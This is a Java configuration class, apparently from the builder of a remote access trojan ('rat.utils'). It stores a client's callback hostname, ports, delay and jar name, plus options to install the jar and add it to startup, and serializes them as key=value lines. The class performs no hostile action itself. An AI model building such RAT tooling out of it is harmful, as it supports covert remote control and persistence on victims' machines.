package rat.utils;

public class ClientBuild {

    private String hostname, fileName;

    private int connectionPort, transferPort, delay;

    private boolean installJar, addToStartup;

    public ClientBuild(String hostname, String fileName, int connectionPort, int transferPort,
                       int delay, boolean installJar, boolean addToStartup) {
        this.hostname = hostname;
        this.fileName = fileName;
        this.connectionPort = connectionPort;
        this.transferPort = transferPort;
        this.delay = delay;
        this.installJar = installJar;
        this.addToStartup = addToStartup;

        if (!this.fileName.endsWith(".jar")) {
            this.fileName += ".jar";
        }
    }

    public String getFileName() {
        return fileName;
    }

    public String getHostname() {
        return hostname;
    }

    public int getConnectionPort() {
        return connectionPort;
    }

    public int getTransferPort() {
        return transferPort;
    }

    public int getDelay() {
        return delay;
    }

    public boolean isInstallJar() {
        return installJar;
    }

    public boolean isAddToStartup() {
        return addToStartup;
    }

    @Override
    public String toString() {
        String result = "";
        String lineSeparator = System.getProperty("line.separator");

        result += "host=" + hostname + lineSeparator;
        result += "connectionPort=" + connectionPort + lineSeparator;
        result += "transferPort=" + transferPort + lineSeparator;
        result += "delay=" + delay + lineSeparator;
        result += "filename=" + fileName + lineSeparator;
        result += "startup=" + (addToStartup == true ? "true" : "false") + lineSeparator;
        result += "install=" + (installJar == true ? "true" : "false") + lineSeparator;

        return result;
    }
}
